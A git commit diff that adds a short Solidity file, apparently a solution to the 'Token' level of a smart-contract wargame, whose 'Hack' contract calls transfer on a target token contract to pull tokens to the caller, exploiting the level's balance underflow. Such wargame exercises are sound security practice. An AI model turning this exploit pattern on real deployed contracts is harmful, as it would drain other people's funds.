a58ee28e2c21f06c8a4fff41f3cb8976d13730ae
Asir Shahriar Roudra <asirroudra@gmail.com>
2023-09-30 00:05:40 +0600

    Update 05_Token.sol

--- 05_Token.sol
+++ 05_Token.sol
@@ -1,1 +1,13 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+interface IToken{
+    function transfer(address to, uint amount) external returns(bool);
+    function balanceOf(address addr) external view returns(uint256);
+}
+
+contract Hack{
+    constructor(address target){
+        IToken(target).transfer(msg.sender,1);
+    }
+}
